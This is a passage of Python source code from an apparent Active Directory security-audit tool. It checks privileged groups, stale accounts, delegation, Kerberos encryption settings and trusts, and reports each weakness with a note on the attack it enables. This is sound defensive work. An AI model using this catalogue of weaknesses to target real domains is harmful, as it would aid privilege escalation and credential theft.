            self._pll_cache = cache
            return cache
        from ldap3.utils.conv import escape_filter_chars
        sams = set()
        for members in self.d.priv_group_members.values():
            for m in members:
                s = get_str(m["attrs"], "sAMAccountName")
                if s:
                    sams.add(s)
        if not sams:
            self._pll_cache = cache
            return cache
        flt = "(|" + "".join(f"(sAMAccountName={escape_filter_chars(s)})" for s in sams) + ")"
        hosts = [get_str(d["attrs"], "dNSHostName") for d in self.d.dcs
                 if get_str(d["attrs"], "dNSHostName")] or [self.args.dc_ip]
        import copy
        for host in _dedup_keep_order(hosts):
            try:
                a = copy.copy(self.args)
                a.dc_ip = host; a.dc_host = host
                sub = ADConnection(a)
                if not sub.connect():
                    continue
                for r in sub.paged_search(self.d.base, flt, ["sAMAccountName", "lastLogon"]):
                    sam = get_str(r["attrs"], "sAMAccountName").lower()
                    ll = get_int(r["attrs"], "lastLogon")
                    if ll > cache.get(sam, 0):
                        cache[sam] = ll
            except Exception as e:
                if self.args.verbose:
                    print(f"[!] --accurate-logon: DC {host} query failed: {e}")
        self._pll_cache = cache
        return cache

    def _reconciled_logon_age(self, m) -> Optional[int]:
        """Newest logon age (days) for an account: min of lastLogonTimestamp age
        and the per-DC lastLogon age (when --accurate-logon). None = never."""
        llt = get_int(m["attrs"], "lastLogonTimestamp")
        best = llt
        sam = get_str(m["attrs"], "sAMAccountName").lower()
        ll = self._priv_last_logon_map().get(sam, 0)
        if ll > best:
            best = ll
        return days_since(filetime_to_dt(best))

    @staticmethod
    def _is_user_account(m) -> bool:
        """True for a real user/computer account, False for a nested GROUP. Group
        members of a privileged group have no userAccountControl, so they were
        wrongly counted as 'admin accounts' and flagged inactive/never-logged-on."""
        return bool(m["attrs"].get("userAccountControl"))

    def _p_admin_count(self):
        da = self.d.priv_group_members.get("Domain Admins", [])
        active_admins = [m for m in da
                         if self._is_user_account(m)
                         and not uac_has(get_int(m["attrs"],"userAccountControl"),
                                         UAC_ACCOUNTDISABLE)]
        threshold = 5
        if len(active_admins) > threshold:
            names = [get_str(m["attrs"],"sAMAccountName") for m in active_admins]
            self._add("P-AdminNum",
                      f"{len(active_admins)} active Domain Admin accounts found "
                      f"(recommended ≤ {threshold}). Reduce attack surface.",
                      names[:30])
        # Check for admins that have never logged in (reconciled across DCs when
        # --accurate-logon, so a DA who only logs on to one DC isn't a false hit).
        never_logon = []
        for m in active_admins:
            if self._reconciled_logon_age(m) is None:
                never_logon.append(get_str(m["attrs"], "sAMAccountName"))
        if never_logon:
            self._add("P-AdminLogin",
                      f"{len(never_logon)} Domain Admin account(s) have never logged in.",
                      never_logon)
        # Email on admin accounts
        with_mail = [get_str(m["attrs"],"sAMAccountName") for m in active_admins
                     if get_str(m["attrs"],"mail")]
        if with_mail:
            self._add("P-AdminEmailOn",
                      f"{len(with_mail)} admin account(s) have email attributes — "
                      "increases phishing/enumeration risk.",
                      with_mail[:20])

    def _p_admin_pwd_age(self):
        # Dedup by account across the three groups, then emit ONE finding with an
        # affected list — previously this added a separate finding per admin,
        # flooding the report (e.g. 16 identical HIGH entries) and inflating the
        # finding count.
        members = {}
        for grpname in ["Domain Admins", "Administrators", "Enterprise Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                if not self._is_user_account(m):   # skip nested groups
                    continue
                sam = get_str(m["attrs"], "sAMAccountName") or dn_base(m.get("dn", ""))
                members.setdefault(sam, (grpname, m))
        affected = []
        for sam, (grpname, m) in members.items():
            if uac_has(get_int(m["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE):
                continue
            age = days_since(filetime_to_dt(get_int(m["attrs"], "pwdLastSet")))
            if age is None or age > 90:
                age_str = f"{age} days" if age is not None else "NEVER"
                affected.append(f"{sam} ({grpname}): password last set {age_str} ago")
        if affected:
            self._add("P-AdminPwdTooOld",
                      f"{len(affected)} privileged account(s) have a password older "
                      "than 90 days. Long-lived Tier-0 credentials are prime targets "
                      "for offline cracking and replay — rotate them and prefer gMSA "
                      "for service identities.",
                      affected)

    def _p_inactive_admins(self):
        affected = []
        seen = set()
        for grpname in ["Domain Admins","Enterprise Admins","Administrators"]:
            for m in self.d.priv_group_members.get(grpname, []):
                if not self._is_user_account(m):   # skip nested groups
                    continue
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                sam = get_str(m["attrs"], "sAMAccountName")
                if sam in seen:
                    continue
                age = self._reconciled_logon_age(m)
                if age is None or age > 180:
                    seen.add(sam)
                    age_str = f"{age} days" if age is not None else "NEVER"
                    affected.append(f"{sam} (last logon: {age_str})")
        if affected:
            self._add("P-Inactive",
                      f"{len(affected)} privileged account(s) inactive for >180 days.",
                      affected[:20])

    def _p_kerberoasting_priv(self):
        affected = []
        for grpname in ["Domain Admins","Enterprise Admins","Schema Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                spns = get_list(m["attrs"], "servicePrincipalName")
                if spns:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    affected.append(f"{sam}: {', '.join(spns[:3])}")
        if affected:
            self._add("P-Kerberoasting",
                      f"{len(affected)} privileged account(s) have SPNs — "
                      "Kerberoasting can reveal their passwords offline.",
                      affected[:20])

    def _p_unconstrained_delegation(self):
        affected = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                continue  # DCs are expected to have this
            if uac_has(uac, UAC_TRUSTED_FOR_DELEGATION):
                sam = get_str(comp["attrs"], "sAMAccountName")
                affected.append(sam)
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_FOR_DELEGATION):
                sam = get_str(user["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("P-UnconstrainedDelegation",
                      f"{len(affected)} non-DC account(s) have unconstrained Kerberos delegation. "
                      "Compromise of these accounts allows impersonating any user to any service.",
                      affected[:30])

    def _p_service_domain_admin(self):
        da_dns = {m.get("dn","").lower()
                  for m in self.d.priv_group_members.get("Domain Admins",[])}
        affected = []
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(user["attrs"], "servicePrincipalName")
            if spns and user["dn"].lower() in da_dns:
                sam = get_str(user["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("P-ServiceDomainAdmin",
                      f"{len(affected)} service account(s) with SPN are members of Domain Admins.",
                      affected[:20])

    def _p_schema_admin(self):
        sa = self.d.priv_group_members.get("Schema Admins", [])
        active = [get_str(m["attrs"],"sAMAccountName") for m in sa
                  if not uac_has(get_int(m["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE)]
        if active:
            self._add("P-SchemaAdmin",
                      f"Schema Admins group has {len(active)} active member(s). "
                      "This group should be empty when schema changes are not in progress.",
                      active[:20])

    def _p_recycle_bin(self):
        # AD Recycle Bin: the feature OBJECT lives under CN=Optional Features, but
        # whether it is ENABLED is recorded by msDS-EnabledFeature on the NC head
        # (CN=Partitions,{cfg}), a forward-link listing the DNs of enabled features.
        feat_dn = ("CN=Recycle Bin Feature,CN=Optional Features,CN=Directory "
                   f"Service,CN=Windows NT,CN=Services,{self.d.cfg}").lower()
        parts = self.d.conn.search_one(
            f"CN=Partitions,{self.d.cfg}",
            "(objectClass=crossRefContainer)",
            ["msDS-EnabledFeature"])
        enabled = False
        if parts:
            enabled_dns = [d.lower() for d in
                           get_list(parts["attrs"], "msDS-EnabledFeature")]
            enabled = feat_dn in enabled_dns
        if not enabled:
            self._add("P-RecycleBin",
                      "AD Recycle Bin is not enabled — deleted objects cannot be recovered "
                      "and attackers can hide tracks more easily.",
                      [])

    def _p_protected_users_priv(self):
        pu = self.d.protected_users
        if not pu:
            return
        pu_dns = {m.lower() for m in get_list(pu["attrs"], "member")}
        not_in = []
        for grpname in ["Domain Admins","Enterprise Admins","Schema Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                if m.get("dn","").lower() not in pu_dns:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    not_in.append(f"{sam} ({grpname})")
        if not_in:
            self._add("P-ProtectedUsers",
                      f"{len(not_in)} privileged account(s) not in Protected Users group. "
                      "They are vulnerable to NTLM relay and credential theft.",
                      not_in[:20])

    def _p_rodc_checks(self):
        for rodc in self.d.dcs:
            if not get_str(rodc["attrs"], "msDS-IsRODC", "").upper() in ("TRUE","1"):
                continue
            dn = rodc["dn"]
            # Check NeverRevealGroup
            never_reveal = get_list(rodc["attrs"], "msDS-NeverRevealGroup")
            if not never_reveal:
                self._add("P-RODCNeverReveal",
                          f"RODC '{dn}' has no msDS-NeverRevealGroup configured.",
                          [dn])
            # Check RevealedUsers for privileged accounts
            revealed = get_list(rodc["attrs"], "msDS-RevealedUsers")
            da_dns_lower = {m.get("dn","").lower()
                            for m in self.d.priv_group_members.get("Domain Admins",[])}
            for r in revealed:
                if r.lower() in da_dns_lower:
                    self._add("P-RODCAdminRevealed",
                              f"Privileged account '{r}' credentials have been "
                              f"revealed/cached on RODC '{dn}'.",
                              [dn, r])

    def _p_dns_admin(self):
        dns_members = self.d.priv_group_members.get("DNSAdmins",
                      self.d.priv_group_members.get("DnsAdmins", []))
        active = [get_str(m["attrs"],"sAMAccountName") for m in dns_members
                  if not uac_has(get_int(m["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE)]
        if active:
            self._add("P-DNSAdmin",
                      f"DNSAdmins group has {len(active)} member(s). "
                      "Members can load arbitrary DLLs into the DNS service on DCs.",
                      active[:20])

    def _p_exchange_priv_esc(self):
        # Check for Exchange Windows Permissions having WriteDACL on domain root
        # This is the classic Exchange PrivEsc (CVE-2019-0686 style)
        ewp = self.d.priv_group_members.get("Exchange Windows Permissions", [])
        if ewp:
            self._add("P-ExchangePrivEsc",
                      f"'Exchange Windows Permissions' group has {len(ewp)} member(s). "
                      "If this group has WriteDACL on the domain object, DCSync is possible. "
                      "Verify ACL on domain root.",
                      [get_str(m["attrs"],"sAMAccountName") for m in ewp[:10]])

    def _p_delegations(self):
        # Constrained delegation with protocol transition (T2A4D)
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_TO_AUTH):
                sam = get_str(user["attrs"], "sAMAccountName")
                self._add("P-DelegationDCt2a4d",
                          f"User '{sam}' has TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition). "
                          "This allows the account to impersonate any user to constrained services.",
                          [sam])
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_TO_AUTH):
                sam = get_str(comp["attrs"], "sAMAccountName")
                self._add("P-DelegationDCt2a4d",
                          f"Computer '{sam}' has TRUSTED_TO_AUTH_FOR_DELEGATION.",
                          [sam])

    def _p_unprotected_ous(self):
        """Look for OUs that lack the accidental-deletion DENY ACE.

        Deletion protection is implemented as a DENY ACE for Everyone
        (S-1-1-0) covering ADS_RIGHT_DS_DELETE_CHILD | DELETE on the OU.
        We only flag OUs that contain DCs or top-level OUs and that are
        actually missing that ACE — no more blanket flags."""
        if not HAS_IMPACKET_LDAP:
            return
        ous = self.d.conn.paged_search(
            self.d.base,
            "(objectClass=organizationalUnit)",
            ["distinguishedName","name","isCriticalSystemObject"])
        EVERYONE_SID = "S-1-1-0"
        # ADS_RIGHT_DS_DELETE_CHILD = 0x40, DELETE = 0x10000
        DEL_MASK = 0x40 | 0x10000
        unprotected: List[str] = []
        for ou in ous:
            dn = ou["dn"]
            # Restrict to top-level OUs and Domain Controllers OU
            parts = [p for p in dn.split(",") if p.strip().upper().startswith("OU=")]
            is_dc_ou = parts and parts[0].strip().upper() == "OU=DOMAIN CONTROLLERS"
            if not (len(parts) == 1 or is_dc_ou):
                continue
            try:
                sd_raw = self.d.conn.fetch_sd(dn)
                if not sd_raw:
                    continue
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw)
                dacl = sd["Dacl"]
                if not dacl:
                    continue
                has_deny = False
                for ace in dacl["Data"]:
                    ace_type = ace["AceType"]
                    # 0x1 = ACCESS_DENIED_ACE_TYPE
                    if ace_type != 0x1:
                        continue
                    sid = ace["Ace"]["Sid"].formatCanonical()
                    if sid != EVERYONE_SID:
                        continue
                    mask = ace["Ace"]["Mask"]["Mask"]
                    if mask & DEL_MASK:
                        has_deny = True
                        break
                if not has_deny:
                    unprotected.append(get_str(ou["attrs"], "name") or dn)
            except Exception:
                continue
        if unprotected:
            self._add("P-UnprotectedOU",
                      f"{len(unprotected)} OU(s) missing the 'Protect object from "
                      "accidental deletion' DENY ACE for Everyone. An attacker (or "
                      "scripted misclick) with delete rights can drop the OU and all "
                      "its child objects.",
                      unprotected)

    # =========================================================================
    # STALE CHECKS (S-)
    # =========================================================================

    def _check_stale(self):
        self._s_inactive_users()
        self._s_inactive_computers()
        self._s_inactive_dcs()
        self._s_dc_not_updated()
        self._s_pwd_never_expires()
        self._s_pwd_not_required()
        self._s_des_enabled()
        self._s_no_preauth()
        self._s_sid_history()
        self._s_pwd_last_set()
        self._s_functional_level()
        self._s_old_os()
        self._s_duplicates()
        self._s_domain_dollar()
        self._s_aes_not_enabled()
        self._s_primary_group()
        self._s_kerberos_armoring()
        self._s_ms14_068()
        self._s_dc_subnet_missing()

    def _s_inactive_users(self):
        threshold = 180
        inactive = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST) or uac_has(uac, UAC_WORKSTATION_TRUST):
                continue
            llt = filetime_to_dt(get_int(u["attrs"], "lastLogonTimestamp"))
            age = days_since(llt)
            if age is None or age > threshold:
                sam = get_str(u["attrs"], "sAMAccountName")
                age_str = f"{age}d" if age is not None else "never"
                inactive.append(f"{sam} ({age_str})")
        if inactive:
            self._add("S-Inactive",
                      f"{len(inactive)} enabled user account(s) have not logged in for "
                      f">{threshold} days.",
                      inactive[:30])

    def _s_inactive_computers(self):
        threshold = 45
        inactive = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                continue  # DCs handled separately
            llt = filetime_to_dt(get_int(comp["attrs"], "lastLogonTimestamp"))
            age = days_since(llt)
            if age is None or age > threshold:
                name = get_str(comp["attrs"], "sAMAccountName")
                inactive.append(name)
        if inactive:
            self._add("S-C-Inactive",
                      f"{len(inactive)} computer account(s) have not authenticated in "
                      f">{threshold} days.",
                      inactive[:30])

    def _s_inactive_dcs(self):
        # lastLogonTimestamp has up to 14-day replication jitter; use 60-day threshold.
        # Do NOT flag if the timestamp is absent/zero — that just means it was never
        # replicated (common on older DCs or freshly promoted ones).
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            llt_raw = get_int(dc["attrs"], "lastLogonTimestamp")
            if not llt_raw:
                continue   # no timestamp available — not flaggable
            llt = filetime_to_dt(llt_raw)
            age = days_since(llt)
            if age is not None and age > 60:
                name = get_str(dc["attrs"], "dNSHostName") or \
                       get_str(dc["attrs"], "sAMAccountName")
                self._add("S-DC-Inactive",
                          f"Domain controller '{name}' last authentication recorded "
                          f"{age} days ago (threshold 60 days, accounting for replication jitter). "
                          "Verify this DC is still online and replicating.",
                          [name])

    def _s_dc_not_updated(self):
        # DC machine account passwords auto-rotate every 30 days by default.
        # Flag if > 60 days to avoid false positives from slight timing differences.
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pls_raw = get_int(dc["attrs"], "pwdLastSet")
            if not pls_raw:
                continue
            pls = filetime_to_dt(pls_raw)
            age = days_since(pls)
            if age is not None and age > 60:
                name = get_str(dc["attrs"], "dNSHostName") or \
                       get_str(dc["attrs"], "sAMAccountName")
                self._add("S-DC-NotUpdated",
                          f"DC '{name}' machine account password last set {age} days ago. "
                          "Default auto-rotation is 30 days. This may indicate the Netlogon "
                          "secure channel is broken or machine password negotiation is disabled.",
                          [name])

    def _s_pwd_never_expires(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-PwdNeverExpires",
                      f"{len(affected)} enabled account(s) have 'Password Never Expires' set.",
                      affected[:30])

    def _s_pwd_not_required(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_PASSWD_NOTREQD):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-PwdNotRequired",
                      f"{len(affected)} enabled account(s) have PASSWD_NOTREQD — "
                      "they may authenticate with an empty password.",
                      affected[:30])

    def _s_des_enabled(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_USE_DES_KEY_ONLY):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-DesEnabled",
                      f"{len(affected)} account(s) have USE_DES_KEY_ONLY set — "
                      "DES is broken and must not be used for Kerberos.",
                      affected[:30])

    def _s_no_preauth(self):
        admin_no_preauth = []
        normal_no_preauth = []
        da_dns = {m.get("dn","").lower()
                  for grp in ["Domain Admins","Enterprise Admins","Administrators"]
                  for m in self.d.priv_group_members.get(grp, [])}
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_REQUIRE_PREAUTH):
                sam = get_str(u["attrs"], "sAMAccountName")
                if u["dn"].lower() in da_dns:
                    admin_no_preauth.append(sam)
                else:
                    normal_no_preauth.append(sam)
        if admin_no_preauth:
            self._add("S-NoPreAuthAdmin",
                      f"{len(admin_no_preauth)} ADMIN account(s) have "
                      "DONT_REQUIRE_PREAUTH — AS-REP roastable, CRITICAL.",
                      admin_no_preauth[:20])
        if normal_no_preauth:
            self._add("S-NoPreAuth",
                      f"{len(normal_no_preauth)} user account(s) have "
                      "DONT_REQUIRE_PREAUTH — AS-REP roastable.",
                      normal_no_preauth[:30])

    def _s_sid_history(self):
        affected = []
        for u in self.d.users + self.d.computers:
            sids = get_list(u["attrs"], "sIDHistory")
            if sids:
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(f"{sam}: {', '.join(str(s) for s in sids[:3])}")
        if affected:
            self._add("S-SIDHistory",
                      f"{len(affected)} object(s) have sIDHistory set — "
                      "these can be used to escalate privileges if SID filtering is not active.",
                      affected[:20])

    def _s_pwd_last_set(self):
        old_45, old_90, dc_old, cluster_old = [], [], [], []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD):
                continue
            pls = filetime_to_dt(get_int(u["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None:
                continue
            sam = get_str(u["attrs"], "sAMAccountName")
            if age > 90:
                old_90.append(sam)
            elif age > 45:
                old_45.append(sam)
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            sam = get_str(comp["attrs"], "sAMAccountName")
            pls = filetime_to_dt(get_int(comp["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None:
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                if age > 45:
                    dc_old.append(f"{sam} ({age}d)")
            elif sam.upper().startswith("MSCLUSTER") or "CLUSTER" in sam.upper():
                if age > 45:
                    cluster_old.append(sam)
        if old_90:
            self._add("S-PwdLastSet-90",
                      f"{len(old_90)} user account(s) have passwords >90 days old.",
                      old_90[:20])
        if old_45:
            self._add("S-PwdLastSet-45",
                      f"{len(old_45)} user account(s) have passwords 45-90 days old.",
                      old_45[:20])
        if dc_old:
            self._add("S-PwdLastSet-DC",
                      f"{len(dc_old)} DC computer account(s) have passwords >45 days old "
                      "(indicates DC may not be updating its password).",
                      dc_old[:10])
        if cluster_old:
            self._add("S-PwdLastSet-Cluster",
                      f"{len(cluster_old)} cluster account(s) have passwords >45 days old.",
                      cluster_old[:10])

    def _s_functional_level(self):
        lvl = max(self.d.domain_level, self.d.forest_level)
        if lvl < 0:
            return
        label = FUNCTIONAL_LEVELS.get(lvl, str(lvl))
        if lvl <= 2:
            self._add("S-FunctionalLevel1",
                      f"Domain/Forest functional level is {label} — "
                      "many modern security features are unavailable.",
                      [label])
        elif lvl == 3:
            self._add("S-FunctionalLevel3",
                      f"Domain/Forest functional level is {label} — "
                      "upgrade to 2012 R2 or higher recommended.",
                      [label])
        elif lvl == 4:
            self._add("S-FunctionalLevel4",
                      f"Domain/Forest functional level is {label} — "
                      "consider upgrading to 2016 for additional protections.",
                      [label])

    def _s_old_os(self):
        xp_hosts, vista_hosts, nt_hosts, w10_eol = [], [], [], []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            os_str = get_str(comp["attrs"], "operatingSystem").lower()
            os_ver = get_str(comp["attrs"], "operatingSystemVersion")
            name   = get_str(comp["attrs"], "dNSHostName") or \
                     get_str(comp["attrs"], "sAMAccountName")
            if any(x in os_str for x in ["nt 4","windows nt"]):
                nt_hosts.append(name)
            elif any(x in os_str for x in ["xp","2003","server 2003"]):
                xp_hosts.append(name)
            elif any(x in os_str for x in ["vista","2008","server 2008"]):
                vista_hosts.append(name)
            elif "windows 10" in os_str:
                # Rough EOL check on build number
                try:
                    build = int(os_ver.split("(")[1].rstrip(")")) if "(" in os_ver else 0
                    if build < 19044:  # earlier than 21H2 (still broadly used threshold)
                        w10_eol.append(f"{name} (build {build})")
                except Exception:
                    pass
        if nt_hosts:
            self._add("S-OS-NT", f"{len(nt_hosts)} NT4-era system(s) in domain.", nt_hosts[:20])
        if xp_hosts:
            self._add("S-OS-XP", f"{len(xp_hosts)} Windows XP/Server 2003 system(s).",
                      xp_hosts[:20])
        if vista_hosts:
            self._add("S-OS-Vista", f"{len(vista_hosts)} Windows Vista/Server 2008 system(s).",
                      vista_hosts[:20])
        if w10_eol:
            self._add("S-OS-W10", f"{len(w10_eol)} EOL Windows 10 build(s) detected.",
                      w10_eol[:20])

    def _s_duplicates(self):
        dupes = [get_str(u["attrs"],"sAMAccountName")
                 for u in self.d.users + self.d.computers
                 if "CNF:" in u.get("dn","")]
        if dupes:
            self._add("S-Duplicate",
                      f"{len(dupes)} CNF (conflict/duplicate) object(s) detected.",
                      dupes[:20])

    def _s_domain_dollar(self):
        ddd = [get_str(u["attrs"],"sAMAccountName")
               for u in self.d.users
               if get_str(u["attrs"],"sAMAccountName","").endswith("$$$")]
        if ddd:
            self._add("S-Domain$$$",
                      f"{len(ddd)} orphaned Domain$$$ account(s) found — "
                      "remnants of failed domain upgrades.",
                      ddd)

    def _s_aes_not_enabled(self):
        """Only flag accounts that (a) have SPNs and (b) explicitly request
        non-AES encryption. An account with msDS-SupportedEncryptionTypes
        unset uses the DC default, which on modern DCs is AES — flagging
        every unset value was a major source of noise."""
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(u["attrs"], "servicePrincipalName")
            if not spns:
                continue   # only matters for kerberoast targets
            enc = get_int(u["attrs"], "msDS-SupportedEncryptionTypes")
            # Bits: 0x4=RC4, 0x8=AES128, 0x10=AES256
            # Flag only when the attribute is set and AES bits are clear.
            if enc != 0 and not (enc & 0x18):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-AesNotEnabled",
                      f"{len(affected)} service account(s) explicitly disable AES — "
                      "Kerberos falls back to RC4 (kerberoast-friendly).",
                      affected[:30])

    def _s_primary_group(self):
        # Domain Users = RID 513; Domain Computers = RID 515
        user_affected, comp_affected = [], []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pg = get_int(u["attrs"], "primaryGroupID")
            if pg not in (0, 513, 514):
                sam = get_str(u["attrs"], "sAMAccountName")
                user_affected.append(f"{sam} (PG RID={pg})")
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pg = get_int(comp["attrs"], "primaryGroupID")
            if pg not in (0, 515, 516):
                sam = get_str(comp["attrs"], "sAMAccountName")
                comp_affected.append(f"{sam} (PG RID={pg})")
        if user_affected:
            self._add("S-PrimaryGroup",
                      f"{len(user_affected)} user account(s) with non-standard primary group.",
                      user_affected[:20])
        if comp_affected:
            self._add("S-C-PrimaryGroup",
                      f"{len(comp_affected)} computer account(s) with non-standard primary group.",
                      comp_affected[:20])

    def _s_kerberos_armoring(self):
        # msDS-SupportedEncryptionTypes on DCs and domain should include FAST
        # Check if CLAIMS_SUPPORTED (0x40) is set in domain SupportedEncTypes
        # As a proxy, check if functional level >= 2012
        if self.d.domain_level is not None and 0 <= self.d.domain_level < 5:
            self._add("S-KerberosArmoring",
                      "Domain functional level below 2012 — Kerberos FAST/armoring "
                      "(RFC 6113) is not available.",
                      [f"DFL={FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])

    def _s_ms14_068(self):
        # MS14-068: PAC validation bypass — patched in KB3011780 (Nov 2014)
        # Proxy check: if DCs are running pre-2012 OS or if domain functional level is old
        vuln_dcs = []
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            os_str = get_str(dc["attrs"], "operatingSystem").lower()
            os_ver = get_str(dc["attrs"], "operatingSystemVersion")
            name   = get_str(dc["attrs"], "dNSHostName") or \
                     get_str(dc["attrs"], "sAMAccountName")
            if any(x in os_str for x in ["2003","2008","xp","vista","nt 4"]):
                vuln_dcs.append(name)
            # Windows 2008 R2 pre-KB3011780: version 6.1.xxxx, build < 7601.18933
            elif "6.1" in os_ver:
                vuln_dcs.append(f"{name} (2008R2 — verify KB3011780)")
        if vuln_dcs:
            self._add("S-Vuln-MS14-068",
                      f"{len(vuln_dcs)} DC(s) may be running OS versions vulnerable to "
                      "MS14-068 PAC forgery. Verify KB3011780 is installed.",
                      vuln_dcs[:10])

    def _s_dc_subnet_missing(self):
        if not self.d.sites or not self.d.subnets:
            return
        defined_subnets = []
        for sub in self.d.subnets:
            cn = get_str(sub["attrs"], "cn")
            if cn:
                try:
                    defined_subnets.append(ipaddress.ip_network(cn, strict=False))
                except ValueError:
                    pass
        missing = []
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            host = get_str(dc["attrs"], "dNSHostName")
            if not host:
                continue
            try:
                ip = ipaddress.ip_address(socket.gethostbyname(host))
                covered = any(ip in net for net in defined_subnets)
                if not covered:
                    missing.append(f"{host} ({ip})")
            except (socket.gaierror, ValueError):
                pass
        if missing:
            self._add("S-DC-SubnetMissing",
                      f"{len(missing)} DC(s) not covered by an AD Sites subnet definition.",
                      missing[:10])

    # =========================================================================
    # TRUST CHECKS (T-)
    # =========================================================================

    def _check_trust(self):
        for trust in self.d.trusts:
            self._t_check_trust(trust)
        # Roadmap item 9: classify every trust (scope / transitivity / direction /
        # SID-filtering) into a reachable-domains map for the report.
        self.d.trust_map = [classify_trust(t["attrs"]) for t in self.d.trusts]
        self._t_azure_ad_sso()

    def _t_check_trust(self, trust: Dict):
        name  = get_str(trust["attrs"], "name") or get_str(trust["attrs"], "trustPartner")
        attrs = get_int(trust["attrs"], "trustAttributes")
        tdir  = get_int(trust["attrs"], "trustDirection")
        ttype = get_int(trust["attrs"], "trustType")
        wc    = trust["attrs"].get("whenChanged")

        # Inactive trust
        if wc:
            try:
                wc_dt = None
                if isinstance(wc, list):
                    wc = wc[0]
                if isinstance(wc, datetime.datetime):
                    wc_dt = wc if wc.tzinfo else wc.replace(tzinfo=datetime.timezone.utc)
                elif isinstance(wc, str):
                    wc_dt = datetime.datetime.fromisoformat(wc.replace("Z","+00:00"))
                if wc_dt:
                    age = days_since(wc_dt)
                    if age is not None and age > 365:
                        self._add("T-Inactive",
                                  f"Trust with '{name}' has not been modified in {age} days.",
                                  [name])
            except Exception:
                pass

        # Downlevel (NT4) trust
        if ttype == TRUST_TYPE_DOWNLEVEL:
            self._add("T-Downlevel",
                      f"Trust with '{name}' is a downlevel (NT4-style) trust. "
                      "These lack modern Kerberos security features.",
                      [name])

        # SID filtering
        # TRUST_ATTR_QUARANTINED_DOMAIN (0x4) = SID filtering enabled.
        # Inbound/bidirectional trusts let the partner's principals authenticate
